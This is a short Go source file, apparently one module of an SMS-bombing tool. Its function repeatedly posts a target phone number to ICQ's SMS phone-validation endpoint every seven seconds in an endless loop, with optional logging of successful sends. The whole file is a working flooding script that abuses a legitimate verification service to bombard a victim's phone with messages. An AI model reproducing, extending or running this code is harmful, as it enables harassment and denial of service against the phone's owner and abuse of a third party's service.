package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func icq() {
	req := newreq()
	req.SetBodyString("msisdn=" + num + "&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763")
	req.SetRequestURI("https://www.icq.com/smsreg/requestPhoneValidation.php")
	req.Header.SetMethod("POST")

	timeout := time.Second * 7
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"statusText":"OK"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
